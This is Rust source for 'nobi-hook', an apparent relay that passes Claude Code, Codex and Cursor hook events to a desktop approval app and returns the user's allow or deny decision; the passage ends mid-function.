//! nobi-hook — the relay Claude Code, Codex and Cursor run on every hook event.
//!
//! Reads the hook JSON on stdin, adds a little terminal context, and hands it to
//! Nobi: over the named pipe `\\.\pipe\nobi-<sid>` on Windows (`win.rs`),
//! over a Unix socket in `~/Library/Application Support/Nobi` on macOS
//! (`mac.rs`) and in `~/.local/state/nobi` on Linux (`linux.rs`). It is also
//! the native-messaging host of the ChatGPT Web extension (`browser.rs`).
//!
//! Hard rule: **never block Claude Code.**
//! * If nobody is listening — Nobi is closed — we exit 0 immediately with
//!   nothing on stdout, and the session carries on untouched.
//! * Talking to the app runs under a deadline enforced by the main thread, so a
//!   pipe that accepts the connection and then stops reading cannot wedge the
//!   session either: we abandon the worker and exit.
//! * Only `PermissionRequest` waits for an answer, because approving from the
//!   island is the whole point. No answer means empty stdout, and Claude Code
//!   asks in the terminal exactly as if Nobi were not installed.
//! * The one exception is the Code tab of the Claude desktop app, which shows
//!   its own permission dialog and never runs `PermissionRequest` hooks. There a
//!   `PreToolUse` for a tool that would ask (see `desktop_gate`) is relayed as a
//!   permission request and answered with a `PreToolUse` decision. Same budget,
//!   same silence when nobody answers: the app's own dialog then appears.
//! * Cursor is the one host that needs words instead of silence: its permission
//!   hooks are installed fail-closed (a crashed relay must not let a command
//!   through), so an empty answer would block the tool. Whenever Nobi gives
//!   no decision — closed, paused, handed back, timed out, or input it could not
//!   read — the relay answers `ask`, and Cursor asks the user itself.
//!
//! A request too large for the app's frame limit (`MAX_FRAME`) has its long
//! strings cut evenly until it fits, and the payload says it was cut (see
//! `fit_frame`).
//!
//! Usage: `nobi-hook <EventName>`, `nobi-hook codex|cursor <EventName>`,
//! `nobi-hook statusline` (the event name is also read from the JSON).

use std::io::{Read, Write};
use std::sync::mpsc;
use std::time::Duration;

/// Whole-run budget for an event nobody waits on: connect and write, no more.
const FIRE_AND_FORGET_BUDGET: Duration = Duration::from_secs(2);
/// How long a permission prompt may stay on screen before the terminal takes over.
const DECISION_BUDGET: Duration = Duration::from_secs(110);

/// Fields that are pointless to forward and can be enormous (a whole file read,
/// a full command output). The island never shows them.
const DROPPED_FIELDS: &[&str] = &["tool_response", "transcript_path"];
/// Longest string forwarded for a field of an event that is only displayed.
const MAX_FIELD_LEN: usize = 2_000;
/// Longest string forwarded for a field of a permission request. What the user
/// approves must be what Claude Code runs: a command cut at 2 000 characters could
/// hide its dangerous half past the cut. Anything longer is still cut, but the
/// payload is flagged and the island treats the request as high risk.
const MAX_APPROVAL_FIELD_LEN: usize = 64 * 1024;
/// Set on the payload when any field had to be cut.
const TRUNCATED_FLAG: &str = "nobi_truncated";
/// The longest line the app reads (`MAX_PAYLOAD` in src-tauri/src/pipe.rs), the
/// newline not counted. A longer one is refused unread, so nothing of it reaches
/// the island and the rules never see it.
const MAX_FRAME: usize = 1 << 20;
/// Making a request fit `MAX_FRAME` never cuts a string shorter than this: below
/// it nothing reviewable would be left, and the terminal is the better place.
const MIN_FIELD_LEN: usize = 256;
/// Top-level strings — the event, the session, the folder, the tool's name — keep
/// at least this much while a request is made to fit.
const KEEP_TOP_LEVEL: usize = 4096;
/// The fields the app reads first. From a line too large to take, it still tells
/// the history what the request was — and what asked instead of it: Cursor, the
/// Claude app or the terminal — from whatever came before the cut (`too_long`
/// in src-tauri/src/pipe.rs), so these go at the front.
const LEAD_KEYS: &[&str] = &["hook_event_name", "session_id", "cwd", "tool_name", "agent_name", "entrypoint"];

mod browser;
#[cfg(target_os = "linux")]
mod linux;
#[cfg(target_os = "macos")]
mod mac;
#[cfg(windows)]
mod win;

// The halves that differ by OS: `connect()` and `ancestors()`.
#[cfg(target_os = "linux")]
use linux as os;
#[cfg(target_os = "macos")]
use mac as os;
#[cfg(windows)]
use win as os;

fn main() {
    let mut args = std::env::args().skip(1);
    let first = args.next().unwrap_or_default();
    if first.starts_with("chrome-extension://") {
        browser::run();
        return;
    }
    if first == "statusline" {
        status_line();
        return;
    }
    let provider = if first == "codex" || first == "cursor" { first.clone() } else { "claude".into() };
    let event_arg = if provider == "claude" { first } else { args.next().unwrap_or_default() };
    // The event as named on the command line, for input that cannot be read.
    let named = event_name(&provider, &event_arg).to_string();
    let Some((payload, event, gated)) = read_event(&provider, event_arg, &Context::from_env()) else {
        // Nothing to relay, so nothing is decided either.
        finish(no_decision_json(&provider, &named))
    };

    let waits_for_answer = event == "PermissionRequest";
    let budget = if waits_for_answer { DECISION_BUDGET } else { FIRE_AND_FORGET_BUDGET };

    // The worker owns every blocking call. If it overruns the budget we simply
    // stop listening and exit: the process dying takes the connection with it.
    let (tx, rx) = mpsc::channel::<Option<String>>();
    std::thread::spawn(move || {
        let _ = tx.send(talk(&payload, waits_for_answer));
    });

    let decided = rx.recv_timeout(budget).ok().flatten().and_then(|decision| {
        if gated {
            pre_tool_use_json(&decision)
        } else {
            output_json(&provider, &event, &decision)
        }
    });
    // No decision: the host agent's own approval UI takes over.
    finish(decided.or_else(|| no_decision_json(&provider, &event)))
}

/// Prints the host's answer, if there is one, and exits.
fn finish(json: Option<String>) -> ! {
    if let Some(json) = json {
        let mut out = std::io::stdout();
        let _ = writeln!(out, "{json}");
        let _ = out.flush();
    }
    std::process::exit(0)
}

/// What the host is told when Nobi gave no decision: the app is closed or
/// paused, the island handed the request back or let it expire, the answer made
/// no sense, or the input could not be read.
///
/// Claude Code and Codex get silence and ask in their own way. Cursor's
/// permission hooks are fail-closed — silence would block the tool, and saying
/// "unavailable" would be untrue for a paused or handed-back request — so Cursor
/// is told to ask the user itself. (A relay that crashes still blocks: that is
/// what fail-closed is for.)
fn no_decision_json(provider: &str, event: &str) -> Option<String> {
    match (provider, event) {
        ("cursor", "PermissionRequest") => {
            Some(serde_json::json!({ "permission": "ask", "user_message": LEFT_TO_CURSOR }).to_string())
        }
        ("cursor", "UserPromptSubmit") => Some(serde_json::json!({ "continue": true }).to_string()),
        _ => None,
    }
}

/// Shown by Cursor with its own approval prompt. In both languages: the relay
/// does not know which one the app is set to.
const LEFT_TO_CURSOR: &str = "Nobi left this request to Cursor. · Nobi bu isteği Cursor'a bıraktı.";

/// Nobi's name for a host's event: Cursor's events are mapped onto Claude
/// Code's, which Codex already uses.
fn event_name<'a>(provider: &str, event: &'a str) -> &'a str {
    if provider != "cursor" {
        return event;
    }
    match event {
        "beforeSubmitPrompt" => "UserPromptSubmit",
        "beforeShellExecution" | "beforeMCPExecution" => "PermissionRequest",
        "afterShellExecution" | "afterMCPExecution" => "PostToolUse",
        "sessionStart" => "SessionStart",
        "sessionEnd" => "SessionEnd",
        "afterAgentResponse" => "Stop",
        other => other,
    }
}

fn output_json(provider: &str, event: &str, answer: &str) -> Option<String> {
    match provider {
        "codex" => codex_decision_json(event, answer),
        "cursor" => cursor_decision_json(event, answer),
        _ => decision_json(answer),
    }
}

/// Codex's PermissionRequest answer: allow, or deny with its message. "Deny and
/// stop" becomes a plain deny here — Codex fails a hook answer that asks to
/// interrupt, so the stop is left out (the app records that it was not sent).
fn codex_decision_json(event: &str, answer: &str) -> Option<String> {
    if event != "PermissionRequest" {
        return None;
    }
    let reply = parse_internal_decision(answer)?;
    let behavior = reply.get("behavior")?.as_str()?;
    if behavior != "allow" && behavior != "deny" {
        return None;
    }
    let mut decision = serde_json::json!({ "behavior": behavior });
    if behavior == "deny" {
        decision["message"] = serde_json::Value::String(clean_message(reply.get("message"), DEFAULT_DENY));
    }
    Some(
        serde_json::json!({
            "hookSpecificOutput": { "hookEventName": "PermissionRequest", "decision": decision }
        })
        .to_string(),
    )
}

/// Cursor's permission answer: allow, or deny with the message for the user and
/// the agent. Its answer has no way to end the agent's turn, so "Deny and stop"
/// is a plain deny here too.
fn cursor_decision_json(event: &str, answer: &str) -> Option<String> {
    if event == "UserPromptSubmit" {
        return Some(serde_json::json!({ "continue": true }).to_string());
    }
    if event != "PermissionRequest" {
        return None;
    }
    let reply = parse_internal_decision(answer)?;
    let behavior = reply.get("behavior")?.as_str()?;
    if behavior != "allow" && behavior != "deny" {
        return None;
    }
    if behavior == "allow" {
        return Some(serde_json::json!({ "permission": "allow" }).to_string());
    }
    let message = clean_message(reply.get("message"), DEFAULT_DENY);
    Some(serde_json::json!({ "permission": "deny", "user_message": message, "agent_message": message }).to_string())
}

fn parse_internal_decision(answer: &str) -> Option<serde_json::Value> {
    let answer = answer.trim();
    match answer {
        "allow" => Some(serde_json::json!({ "behavior": "allow" })),
        "deny" => Some(serde_json::json!({ "behavior": "deny" })),
        _ => serde_json::from_str(answer).ok(),
    }
}

fn clean_message(value: Option<&serde_json::Value>, fallback: &str) -> String {
    let message = value
        .and_then(serde_json::Value::as_str)
        .unwrap_or(fallback)
        .chars()
        .filter(|c| !c.is_control() || *c == '\n')
        .take(MAX_MESSAGE)
        .collect::<String>()
        .trim()
        .to_string();
    if message.is_empty() {
        fallback.to_string()
    } else {
        message
    }
}

/// Longest denial message passed on to Claude Code.
const MAX_MESSAGE: usize = 500;
const DEFAULT_DENY: &str = "Denied through Nobi.";

/// The documented PermissionRequest output, built from what the app answered.
///
/// The app speaks a small JSON line — `{"behavior":"allow"}` or
/// `{"behavior":"deny","message":…,"interrupt":…,"stop":…}` — and the bare words
/// `allow` / `deny` are still understood. Anything we do not recognise prints
/// nothing at all rather than guessing: silence is the safe answer.
/// See https://code.claude.com/docs/en/hooks (PermissionRequest decision control).
fn decision_json(answer: &str) -> Option<String> {
    let answer = answer.trim();
    let reply: serde_json::Value = match answer {
        "allow" => serde_json::json!({ "behavior": "allow" }),
        "deny" => serde_json::json!({ "behavior": "deny" }),
        _ => serde_json::from_str(answer).ok()?,
    };
    let clean = |v: Option<&serde_json::Value>| -> Option<String> {
        let s: String = v?.as_str()?.chars().filter(|c| !c.is_control() || *c == '\n').take(MAX_MESSAGE).collect();
        let s = s.trim().to_string();
        (!s.is_empty()).then_some(s)
    };

    let mut out = match reply.get("behavior").and_then(|b| b.as_str())? {
        "allow" => {
            let mut decision = serde_json::json!({ "behavior": "allow" });
            if let Some(input) = reply.get("updatedInput").filter(|v| v.is_object()) {
                decision["updatedInput"] = input.clone();
            }
            serde_json::json!({ "hookSpecificOutput": { "hookEventName": "PermissionRequest", "decision": decision } })
        }
        "deny" => {
            let message = clean(reply.get("message")).unwrap_or_else(|| DEFAULT_DENY.to_string());
            // Claude always reads `message`. `interrupt: true` also stops it, which
            // only "Deny and stop" asks for; a plain deny lets Claude carry on
            // with the reason in hand. The app spells the flag out on every deny,
            // so a missing one — an older app, the bare word `deny` — is plain.
            let interrupt = reply.get("interrupt").and_then(|v| v.as_bool()).unwrap_or(false);
            serde_json::json!({
                "hookSpecificOutput": {
                    "hookEventName": "PermissionRequest",
                    "decision": { "behavior": "deny", "message": message, "interrupt": interrupt }
                }
            })
        }
        _ => return None,
    };
    // "Deny and stop": the universal `continue: false` ends the turn outright.
    if reply.get("stop").and_then(|v| v.as_bool()) == Some(true) {
        let reason = clean(reply.get("message")).unwrap_or_else(|| "Stopped by Nobi.".to_string());
        out["continue"] = serde_json::Value::Bool(false);
        out["stopReason"] = serde_json::Value::String(reason);
    }
    Some(out.to_string())
}

/// The documented PreToolUse output for a request gated in the Claude desktop
/// app (see `desktop_gate`) or for a question or plan (see `interactive_tool`). `allow` skips the app's own permission dialog,
/// `deny` blocks the tool and tells Claude why; anything else prints nothing,
/// and the app asks as usual.
/// See https://code.claude.com/docs/en/hooks (PreToolUse decision control).
fn pre_tool_use_json(answer: &str) -> Option<String> {
    let reply = parse_internal_decision(answer)?;
    let mut out = match reply.get("behavior")?.as_str()? {
        "allow" => {
            let mut out = serde_json::json!({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": "allow",
                    "permissionDecisionReason": "Approved in Nobi."
                }
            });
            // AskUserQuestion and ExitPlanMode only run when the answer comes back
            // in updatedInput: an allow alone would leave them waiting for a person.
            if let Some(input) = reply.get("updatedInput").filter(|v| v.is_object()) {
                out["hookSpecificOutput"]["updatedInput"] = input.clone();
            }
            out
        }
        "deny" => serde_json::json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": clean_message(reply.get("message"), DEFAULT_DENY)
            }
        }),
        _ => return None,
    };
    if reply.get("stop").and_then(|v| v.as_bool()) == Some(true) {
        out["continue"] = serde_json::Value::Bool(false);
        out["stopReason"] = serde_json::Value::String(clean_message(reply.get("message"), "Stopped by Nobi."));
    }
    Some(out.to_string())
}

/// The `CLAUDE_CODE_ENTRYPOINT` of the Code tab in the Claude desktop app.
const DESKTOP_ENTRYPOINT: &str = "claude-desktop";

/// Tools that ask for permission by default in Claude Code.
const ASKING_TOOLS: &[&str] = &["Bash", "PowerShell", "Write", "Edit", "MultiEdit", "NotebookEdit", "WebFetch"];
/// The subset that `acceptEdits` mode lets through without asking.
const EDIT_TOOLS: &[&str] = &["Write", "Edit", "MultiEdit", "NotebookEdit"];

/// Whether a `PreToolUse` should be relayed as a permission request: only in the
/// Claude desktop app (which never runs `PermissionRequest` hooks), only for tools
/// that would normally ask, and only in modes where the app would ask at all.
///
/// The gate goes by tool, not by request: the relay cannot see the app's own
/// allow list, so a command the app would have run without asking waits on the
/// island too, up to the full budget when nobody is there. A known, documented
/// trade-off (the island's rules and trusted projects can let such commands
/// through); the gate never makes anything run that would not have run.
fn desktop_gate(entrypoint: &str, tool: &str, mode: &str) -> bool {
    if entrypoint != DESKTOP_ENTRYPOINT {
        return false;
    }
    let asks = ASKING_TOOLS.contains(&tool) || tool.starts_with("mcp__");
    match mode {
        "" | "default" | "plan" => asks,
        "acceptEdits" => asks && !EDIT_TOOLS.contains(&tool),
        // bypassPermissions, dontAsk, auto and anything newer: the user chose not
        // to be asked, so Nobi does not ask either.
        _ => false,
    }
}

/// Claude's own tools that wait for the user rather than for permission: its
/// multiple-choice questions and its plan. A `PreToolUse` hook may answer them
/// (allow with the answer in `updatedInput`), so the island can. Silence leaves
/// the terminal or app to ask as usual.
fn interactive_tool(tool: &str) -> bool {
    matches!(tool, "AskUserQuestion" | "ExitPlanMode")
}

/// What the relay takes from its environment: where the session runs. Read once,
/// in `main`, and handed down, so nothing else — no test either — depends on the
/// variables of the process that runs it (a test run from the Claude desktop
/// app's Code tab inherits CLAUDE_CODE_ENTRYPOINT=claude-desktop).
#[derive(Default)]
struct Context {
    term_program: String,
    wt_session: String,
    vscode_pid: String,
    /// `CLAUDE_CODE_ENTRYPOINT`: the CLI, the VS Code extension or the Code tab
    /// of the Claude desktop app ("claude-desktop").
    entrypoint: String,
    /// The working folder, for an event that names none.
    cwd: Option<String>,
}

impl Context {
    fn from_env() -> Self {
        let var = |name: &str| std::env::var(name).unwrap_or_default();
        Context {
            term_program: var("TERM_PROGRAM"),
            wt_session: var("WT_SESSION"),
            vscode_pid: var("VSCODE_PID"),
            entrypoint: var("CLAUDE_CODE_ENTRYPOINT"),
            cwd: std::env::current_dir().ok().map(|dir| dir.to_string_lossy().to_string()),
        }
    }
}

/// Reads stdin and returns the payload to forward, the event name, and whether it
/// is a `PreToolUse` gated as a permission request (see `desktop_gate`).
fn read_event(provider: &str, arg_event: String, context: &Context) -> Option<(String, String, bool)> {
    let mut raw = Vec::new();
    if std::io::stdin().read_to_end(&mut raw).is_err() || raw.is_empty() {
        return None;
    }
    // The process chain lets the app bring the session's terminal or editor window
    // to the front. Only the events that open or ask something carry it: walking
    // the process table costs a millisecond or two.
    let peek = String::from_utf8_lossy(&raw[..raw.len().min(4096)]).to_string();
    let wants_parents = [
        "SessionStart",
        "UserPromptSubmit",
        "PermissionRequest",
        "beforeSubmitPrompt",
        "beforeShellExecution",
        "beforeMCPExecution",
    ]
    .iter()
    .any(|e| arg_event == *e || peek.contains(&format!("\"{e}\"")))
        || peek.contains("\"AskUserQuestion\"")
        || peek.contains("\"ExitPlanMode\"")
        || (context.entrypoint == DESKTOP_ENTRYPOINT && (arg_event == "PreToolUse" || peek.contains("\"PreToolUse\"")));
    let parents = wants_parents.then(|| os::ancestors(12));
    prepare(&raw, provider, arg_event, parents, context)
}

/// Turns the raw hook JSON into the line sent over the pipe. Split from
/// `read_event` so it can be tested without stdin or a real environment: what
/// the environment says comes in as `context`.
fn prepare(
    raw: &[u8],
    provider: &str,
    arg_event: String,
    parents: Option<Vec<(u32, String)>>,
    context: &Context,
) -> Option<(String, String, bool)> {
    // Some shells hand us a UTF-8 BOM; serde_json would choke on it.
    let raw = raw.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(raw);

    let mut payload = serde_json::from_slice::<serde_json::Value>(raw).ok()?;
    let map = payload.as_object_mut()?;

    // The event name is passed as argv[1] by the hook command; the JSON usually
    // carries it too. Trust argv when the JSON is missing it.
    let source_event = map
        .get("hook_event_name")
        .and_then(|v| v.as_str())
        .map(str::to_string)
        .filter(|s| !s.is_empty())
        .unwrap_or(arg_event);
    let mut event = event_name(provider, &source_event).to_string();
    map.insert("hook_event_name".into(), serde_json::Value::String(event.clone()));

    if provider != "claude" {
        map.insert(
            "agent_name".into(),
            serde_json::Value::String(if provider == "codex" { "Codex" } else { "Cursor" }.into()),
        );
    }
    if provider == "cursor" {
        if !map.contains_key("session_id") {
            if let Some(id) = map
                .get("conversation_id")
                .and_then(|v| v.as_str())
                .or_else(|| map.get("generation_id").and_then(|v| v.as_str()))
            {
                map.insert("session_id".into(), serde_json::Value::String(id.to_string()));
            }
        }
        if !map.contains_key("cwd") {
            if let Some(cwd) =
                map.get("workspace_roots").and_then(|v| v.as_array()).and_then(|a| a.first()).and_then(|v| v.as_str())
            {
                map.insert("cwd".into(), serde_json::Value::String(cwd.to_string()));
            }
        }
        match source_event.as_str() {
            "beforeShellExecution" | "afterShellExecution" => {
                map.insert("tool_name".into(), serde_json::Value::String("Bash".into()));
                if let Some(command) = map.get("command").cloned() {
                    map.insert("tool_input".into(), serde_json::json!({"command": command}));
                }
            }
            "beforeMCPExecution" | "afterMCPExecution" => {
                let server = map.get("mcp_server_name").and_then(|v| v.as_str()).unwrap_or("cursor");
                let tool = map.get("tool_name").and_then(|v| v.as_str()).unwrap_or("tool");
                map.insert("tool_name".into(), serde_json::Value::String(format!("mcp__{server}__{tool}")));
                if let Some(input) = map
                    .get("tool_input")
                    .and_then(|v| v.as_str())
                    .and_then(|s| serde_json::from_str::<serde_json::Value>(s).ok())
                {
                    map.insert("tool_input".into(), input);
                }
            }
            _ => {}
        }
    }

    let change = (event == "PostToolUse").then(|| file_change(map)).flatten();

    for field in DROPPED_FIELDS {
        map.remove(*field);
    }

    let cwd_missing = map.get("cwd").and_then(|v| v.as_str()).map(str::is_empty).unwrap_or(true);
    if cwd_missing {
        if let Some(cwd) = &context.cwd {
            map.insert("cwd".into(), serde_json::Value::String(cwd.clone()));
        }
    }

    // Which terminal the session runs in — context only, never a filter.
    // `entrypoint` says which Claude Code it is: the CLI, the VS Code extension
    // or the Code tab of the Claude desktop app ("claude-desktop").
    for (key, value) in [
        ("term_program", &context.term_program),
        ("wt_session", &context.wt_session),
        ("vscode_pid", &context.vscode_pid),
        ("entrypoint", &context.entrypoint),
    ] {
        if !map.contains_key(key) {
            map.insert(key.into(), serde_json::Value::String(value.clone()));
        }
    }

    if let Some(chain) = parents {
        let list: Vec<serde_json::Value> =
            chain.into_iter().map(|(pid, name)| serde_json::json!({ "pid": pid, "name": name })).collect();
        map.insert("nobi_parents".into(), serde_json::Value::Array(list));
    }

    let text = |key: &str| map.get(key).and_then(|v| v.as_str()).unwrap_or_default().to_string();
    let gated = provider == "claude"
        && event == "PreToolUse"
        && (interactive_tool(&text("tool_name"))
            || desktop_gate(&text("entrypoint"), &text("tool_name"), &text("permission_mode")));
    if gated {
        event = "PermissionRequest".to_string();
        map.insert("hook_event_name".into(), serde_json::Value::String(event.clone()));
        map.insert("nobi_via".into(), serde_json::Value::String("PreToolUse".into()));
    }

    let limit = if event == "PermissionRequest" { MAX_APPROVAL_FIELD_LEN } else { MAX_FIELD_LEN };
    if truncate_strings(&mut payload, limit) {
        flag_cut(&mut payload);
    }

    // Added after the cut: the diff has its own, larger cap.
    if let (Some(change), Some(map)) = (change, payload.as_object_mut()) {
        map.insert("nobi_change".into(), change);
    }

    // One line, ended by a newline: the app reads up to it and drops a frame
    // that ends without one.
    let mut line = fit_frame(&mut payload, limit);
    line.push('\n');
    Some((line, event, gated))
}

fn flag_cut(payload: &mut serde_json::Value) {
    if let Some(map) = payload.as_object_mut() {
        map.insert(TRUNCATED_FLAG.into(), serde_json::Value::Bool(true));
    }
}

/// The payload as the JSON line the app reads (no newline), cut to fit
/// `MAX_FRAME`.
///
/// Usually it fits as it is. When it does not — a MultiEdit of many large edits,
/// an MCP call with many large arguments — every string longer than some length
/// is cut to that length, the longest at which the line fits, so each field
/// keeps as much as the others. Top-level strings keep at least
/// `KEEP_TOP_LEVEL`. The payload is then flagged as cut, which the app scores as
/// high risk and never lets a rule or grant approve: what the card shows is not
/// all of what would run.
///
/// If even `MIN_FIELD_LEN` is not enough, the request's shape itself is too large
/// to show (say, an argument holding a hundred thousand numbers). The line then
/// goes as it is: the app refuses it, writes what its start says into the
/// history, and the host asks in its own way, where the whole request is seen.
fn fit_frame(payload: &mut serde_json::Value, limit: usize) -> String {
    let line = to_json(payload);
    if line.len() <= MAX_FRAME {
        return line;
    }
    // The longest cap that fits; caps are tried on copies, so a cap that does
    // not fit leaves nothing behind. Cutting shorter can only shrink the line
    // (give or take the three bytes of a "…"), so halving the range works.
    let (mut lo, mut hi) = (MIN_FIELD_LEN.min(limit), limit);
    let mut best: Option<(serde_json::Value, String)> = None;
    while lo < hi {
        let cap = lo + (hi - lo) / 2;
        let mut trial = payload.clone();
        if cap_strings(&mut trial, cap) {
            flag_cut(&mut trial);
        }
        let candidate = to_json(&trial);
        if candidate.len() <= MAX_FRAME {
            best = Some((trial, candidate));
            lo = cap + 1;
        } else {
            hi = cap;
        }
    }
    match best {
        Some((trial, candidate)) => {
            *payload = trial;
            candidate
        }
        None => line,
    }
}

/// `truncate_strings` for a whole payload, sparing the top-level strings down to
/// `KEEP_TOP_LEVEL`. True when anything was cut.
fn cap_strings(payload: &mut serde_json::Value, cap: usize) -> bool {
    match payload.as_object_mut() {
        Some(map) => map.values_mut().fold(false, |cut, value| {
            let limit = if value.is_string() { cap.max(KEEP_TOP_LEVEL) } else { cap };
            truncate_strings(value, limit) | cut
        }),
        None => truncate_strings(payload, cap),
    }
}

/// Compact JSON with `LEAD_KEYS` first, whatever order the map keeps its keys in.
fn to_json(payload: &serde_json::Value) -> String {
    let Some(map) = payload.as_object() else { return payload.to_string() };
    let lead = LEAD_KEYS.iter().filter_map(|key| map.get(*key).map(|value| (*key, value)));
    let rest = map.iter().filter(|(key, _)| !LEAD_KEYS.contains(&key.as_str())).map(|(k, v)| (k.as_str(), v));
    let mut out = String::from("{");
    for (i, (key, value)) in lead.chain(rest).enumerate() {
        if i > 0 {
            out.push(',');
        }
        out.push_str(&serde_json::Value::from(key).to_string());
        out.push(':');
        out.push_str(&value.to_string());
    }
    out.push('}');
    out
}

/// Longest diff forwarded with a file change, in bytes.
const MAX_DIFF_LEN: usize = 12_000;

/// What a finished file edit changed, for the island's change list: the file,
/// lines added and removed, and a short diff. Taken from Claude Code's own patch
/// (`tool_response.structuredPatch`) when it sends one, else from the edit's
/// input. Display only: nothing here is ever approved.
fn file_change(map: &serde_json::Map<String, serde_json::Value>) -> Option<serde_json::Value> {
    let tool = map.get("tool_name")?.as_str()?;
    if !matches!(tool, "Edit" | "MultiEdit" | "Write" | "NotebookEdit") {
        return None;
    }
    let input = map.get("tool_input")?;
    let file = input.get("file_path").or_else(|| input.get("notebook_path"))?.as_str()?.to_string();
    let response = map.get("tool_response");
    let created = response.and_then(|r| r.get("type")).and_then(|v| v.as_str()) == Some("create");

    let mut lines: Vec<String> = Vec::new();
    let patch = response.and_then(|r| r.get("structuredPatch")).and_then(|v| v.as_array()).filter(|p| !p.is_empty());
    if let Some(hunks) = patch {
        for hunk in hunks {
            let n = |k: &str| hunk.get(k).and_then(|v| v.as_u64()).unwrap_or(0);
            lines.push(format!("@@ -{},{} +{},{} @@", n("oldStart"), n("oldLines"), n("newStart"), n("newLines")));
            for l in hunk.get("lines").and_then(|v| v.as_array()).into_iter().flatten() {
                if let Some(text) = l.as_str() {
                    lines.push(text.to_string());
                }
            }
        }
    } else {
        let text = |v: Option<&serde_json::Value>| v.and_then(|v| v.as_str()).unwrap_or("").to_string();
        let mut pair = |old: String, new: String| {
            lines.extend(old.lines().map(|l| format!("-{l}")));
            lines.extend(new.lines().map(|l| format!("+{l}")));
        };
        match tool {
            "Edit" => pair(text(input.get("old_string")), text(input.get("new_string"))),
            "MultiEdit" => {
                for edit in input.get("edits").and_then(|v| v.as_array()).into_iter().flatten() {
                    pair(text(edit.get("old_string")), text(edit.get("new_string")));
                }
            }
            "Write" => pair(String::new(), text(input.get("content"))),
            _ => pair(String::new(), text(input.get("new_source"))),
        }
    }

    let added = lines.iter().filter(|l| l.starts_with('+')).count();
    let removed = lines.iter().filter(|l| l.starts_with('-')).count();
    let mut diff = lines.join("\n");
    let cut = diff.len() > MAX_DIFF_LEN;
    if cut {
        let mut end = MAX_DIFF_LEN;
        while end > 0 && !diff.is_char_boundary(end) {
            end -= 1;
        }
        diff.truncate(end);
    }
    Some(serde_json::json!({
        "file": file,
        "added": added,
        "removed": removed,
        "created": created,
        "diff": diff,
        "cut": cut,
    }))
}

/// `nobi-hook statusline`: Claude Code's status line command. It hands us the
/// session's context use, cost and plan limits on stdin; we pass them to the
/// island (never waiting for it) and print a short line for Claude Code to show.
fn status_line() {
    let mut raw = Vec::new();
    let _ = std::io::stdin().take(1 << 20).read_to_end(&mut raw);
    let raw = raw.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(&raw);
    let data: serde_json::Value = serde_json::from_slice(raw).unwrap_or(serde_json::Value::Null);
    if let Some(line) = status_payload(&data, &Context::from_env().entrypoint) {
        let (tx, rx) = mpsc::channel::<()>();
        std::thread::spawn(move || {
            let _ = talk(&line, false);
            let _ = tx.send(());
        });
        // The status line redraws while we run: never hold it up for long.
        let _ = rx.recv_timeout(Duration::from_millis(400));
    }
    let mut out = std::io::stdout();
    let _ = writeln!(out, "{}", status_text(&data));
    let _ = out.flush();
}

/// The few fields of the status line input the island uses, as a hook event.
/// `entrypoint`: the session's CLAUDE_CODE_ENTRYPOINT (`Context`).
fn status_payload(data: &serde_json::Value, entrypoint: &str) -> Option<String> {
    let session = data.get("session_id")?.as_str()?;
    let number = |path: &[&str]| -> serde_json::Value {
        let mut v = data;
        for key in path {
            match v.get(*key) {
                Some(next) => v = next,
                None => return serde_json::Value::Null,
            }
        }
        if v.is_number() {
            v.clone()
        } else {
            serde_json::Value::Null
        }
    };
    let cwd = data
        .get("workspace")
        .and_then(|w| w.get("current_dir"))
        .or_else(|| data.get("cwd"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let model = data.get("model").and_then(|m| m.get("display_name")).and_then(|v| v.as_str()).unwrap_or("");
    let window = |name: &str| {
        serde_json::json!({
            "used": number(&["rate_limits", name, "used_percentage"]),
            "resets_at": number(&["rate_limits", name, "resets_at"]),
        })
    };
    let mut payload = serde_json::json!({
        "hook_event_name": "StatusLine",
        "session_id": session,
        "cwd": cwd,
        "model": model.chars().take(80).collect::<String>(),
        "context_used": number(&["context_window", "used_percentage"]),
        "cost_usd": number(&["cost", "total_cost_usd"]),
        "five_hour": window("five_hour"),
        "seven_day": window("seven_day"),
        "entrypoint": entrypoint,
    });
    // A handful of short strings: capped, the line is always a fraction of a frame.
    truncate_strings(&mut payload, MAX_FIELD_LEN);
    let mut line = to_json(&payload);
    line.push('\n');
    Some(line)
}

/// What Claude Code shows: the model, context use and plan limits, whatever of
/// them it sent.
fn status_text(data: &serde_json::Value) -> String {
    let pct = |path: &[&str]| -> Option<String> {
        let mut v = data;
        for key in path {
            v = v.get(*key)?;
        }
        Some(format!("{}%", v.as_f64()?.round() as i64))
    };
    let model = data.get("model").and_then(|m| m.get("display_name")).and_then(|v| v.as_str());
    let parts: Vec<String> = [
        model.map(|m| m.chars().filter(|c| !c.is_control()).take(40).collect()),
        pct(&["context_window", "used_percentage"]).map(|p| format!("ctx {p}")),
        pct(&["rate_limits", "five_hour", "used_percentage"]).map(|p| format!("5h {p}")),
        pct(&["rate_limits", "seven_day", "used_percentage"]).map(|p| format!("7d {p}")),
    ]
    .into_iter()
    .flatten()
    .collect();
    if parts.is_empty() {
        "Nobi".to_string()
    } else {
        format!("Nobi · {}", parts.join(" · "))
    }
}

/// Caps every string in the payload. Returns true when anything was cut.
fn truncate_strings(value: &mut serde_json::Value, limit: usize) -> bool {
    match value {
        serde_json::Value::String(s) => {
            if s.len() <= limit {
                return false;
            }
            // Cut on a char boundary; a lone byte index can split UTF-8.
            let mut end = limit;
            while end > 0 && !s.is_char_boundary(end) {
                end -= 1;
            }
            s.truncate(end);
            s.push('…');
            true
        }
        serde_json::Value::Array(items) => {
            items.iter_mut().fold(false, |cut, item| truncate_strings(item, limit) | cut)
        }
        serde_json::Value::Object(map) => map.values_mut().fold(false, |cut, item| truncate_strings(item, limit) | cut),
        _ => false,
    }
}

/// Connect, send, and — for a permission request — wait for the island's word.
fn talk(payload: &str, waits_for_answer: bool) -> Option<String> {
    let mut pipe = os::connect()?;

    if pipe.write_all(payload.as_bytes()).is_err() {
        return None;
    }
    let _ = pipe.flush();

    if !waits_for_answer {
        return None;
    }

    // The answer is one line. An answer to a question or a plan echoes the tool's
    // input and can be long, so each chunk is searched once, not the whole buffer.
    let mut buf = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        match pipe.read(&mut chunk) {
            Ok(0) | Err(_) => break,
            Ok(n) => {
